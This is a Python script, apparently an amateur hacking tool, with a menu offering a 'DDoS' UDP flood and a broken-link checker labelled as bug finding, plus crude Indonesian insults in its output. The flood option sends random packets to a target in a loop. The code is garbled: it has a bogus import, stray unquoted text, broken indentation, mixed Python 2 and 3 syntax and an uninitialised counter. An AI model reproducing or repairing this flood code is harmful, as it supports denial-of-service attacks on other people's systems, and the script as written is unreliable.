import sys
import time
import socket
import random
import sleep
import os 
import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin 

red = '\033[1;91m'
white = '\033[37m'
green = '\033[1;32m'
yellow = '\033[1;33m'
blue = '\033[1;34m'

# Main Menu
time.sleep(0.8)

red = '\033[1;91m'
white = '\033[37m'
green = '\033[1;32m'
yellow = '\033[1;33m'
blue = '\033[1;34m'

print (f"""{red}|========================================|
                |[01] DDoS [Project]{green}                                       |
                |[02] Finding Bug {white}[New]                                        |
                |[03] Null                                       |
                |[04] Null                                        |
                |[05] Null                                        |
                |[06] Null                                        |
                |[07] Null                                        |
                |[08] Null                                        |
                |[09] Null                                        |
                |[10] Null                                        |
                |========================================|{red}
                """) 
                
                \033[1;91mCoded By : ./Itingsss
                          Versi    : Beta Tester
                          Team     :Jawa Barat Error Network
                          
print('')
print(f'\033[37m')
print(f"╭─[{yellow} Itingss@root {white} ~/home")
answer = input("╰─$ ")
print('\033[1;32m\n')
if answer == ("1"):
  #Set the target
target = ("https://example.com/")

attacklength = 10000

#Create a socket
client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

#Pack bytes
bytes = random._urandom(1024)

#Start attack
for i in range(1, attacklength):
    client.sendto(bytes,(target,80))
    sent = sent + 1
    print "Attack Packets Sent: %s" % (sent)
    if i == attacklength:
        print "DDoS Attack Finished. %s Packets Targeted to %s" % (sent, target)
        sys.exit()
        exit()
elif answer == ("2"):
  def find_broken_links(url):
    try:
        response = requests.get(url)
        if response.status_code == 200:
            soup = BeautifulSoup(response.content, 'html.parser')
            links = soup.find_all('a')
            
            broken_links = []
            
            for link in links:
                href = link.get('href')
                if href:
                    full_url = urljoin(url, href)
                    link_response = requests.head(full_url)
                    if link_response.status_code >= 400:
                        broken_links.append((full_url, link_response.status_code))
            
            return broken_links
        
        else:
            print(f"Gagal lu anj {url}. Status code: {response.status_code}")
    except requests.RequestException as e:
        print(f"Akses Eror anj {url}: {e}")

# Example usage:
website_url = input ('Masukin Target Anj : ')
broken_links = find_broken_links(website_url)

if broken_links:
    print("Bug ditemukan:")
    for link, status_code in broken_links:
        print(f"URL: {link} - Status Code: {status_code}")
else:
    print("Ga ada Bug di Website nya TOLOL")
    exit()
        
